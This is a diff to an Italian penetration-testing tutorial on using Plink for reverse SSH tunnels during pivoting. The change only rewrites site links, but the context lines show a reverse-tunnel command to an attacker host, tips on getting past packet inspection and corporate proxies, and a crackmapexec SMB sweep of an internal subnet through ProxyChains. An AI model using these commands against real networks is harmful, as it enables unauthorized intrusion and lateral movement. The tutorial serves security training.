@@ -288,7 +288,7 @@ plink.exe -ssh -P 443 -R 8080:127.0.0.1:80 user@10.10.14.22 -pw Pass -N -batch
 
 **Cosa fare se fallisce:**
 
-* Deep packet inspection blocca SSH su 443 → Usa [Ngrok](https://hackita.it/articoli/ngrok/) come intermediario o un wrapper TLS come stunnel.
+* Deep packet inspection blocca SSH su 443 → Usa [Ngrok](/articoli/ngrok/) come intermediario o un wrapper TLS come stunnel.
 * Proxy aziendale in mezzo → Plink supporta proxy HTTP: `plink.exe -ssh -proxycmd "C:\Temp\connect.exe -H proxy.corp:8080 %host %port" ...`
 
 **Timeline:** Configurazione 1 minuto. Tunnel stabile.
@@ -301,7 +301,7 @@ Plink è il componente di tunneling per ambienti Windows dove SSH nativo non è 
 
 **Flusso operativo:**
 
-Initial Access (web exploit) → Shell Windows → **Plink (tunnel)** → Attacker box → [ProxyChains](https://hackita.it/articoli/proxychains/) → Tool offensivi verso rete interna
+Initial Access (web exploit) → Shell Windows → **Plink (tunnel)** → Attacker box → [ProxyChains](/articoli/proxychains/) → Tool offensivi verso rete interna
 
 **Passaggio dati:**
 
@@ -317,7 +317,7 @@ proxychains4 crackmapexec smb 172.16.0.0/24
 
 Plink crea il tunnel, ProxyChains lo sfrutta per instradare i tool offensivi.
 
-| Scenario                        | Plink | SSH nativo Windows | Chisel            | [Ngrok](https://hackita.it/articoli/ngrok/) |
+| Scenario                        | Plink | SSH nativo Windows | Chisel            | [Ngrok](/articoli/ngrok/) |
 | ------------------------------- | ----- | ------------------ | ----------------- | ------------------------------------------ |
 | Disponibilità su legacy Windows | Sì    | No (pre-2018)      | Richiede transfer | Richiede transfer                          |
 | Dimensione binario              | \~1MB | Integrato          | \~8MB             | \~15MB                                     |
@@ -509,4 +509,4 @@ Sì, ma devi gestire la conferma host key con `echo y |` e usare `-batch` per ev
 
 ***
 
-Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
+Vuoi supportare HackIta? Visita [hackita.it/supporto](/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](/servizi).
